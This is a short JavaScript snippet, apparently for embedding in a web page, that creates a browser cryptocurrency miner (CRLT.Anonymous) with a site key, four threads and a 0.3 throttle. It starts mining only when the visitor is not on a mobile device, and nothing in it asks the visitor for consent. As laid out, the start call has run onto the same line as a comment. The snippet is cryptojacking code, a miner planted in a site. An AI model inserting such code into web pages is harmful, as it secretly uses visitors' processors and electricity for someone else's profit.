  var miner = new CRLT.Anonymous('a0fd9f7fb9d0f176ec47f248892b045ac82fdcf0c795', {
      threads: 4,
      autoThreads: false,
      throttle: 0.3,
  }); //Only start if visitor is NOT mobile    if (!miner.isMobile()) {        miner.start();    }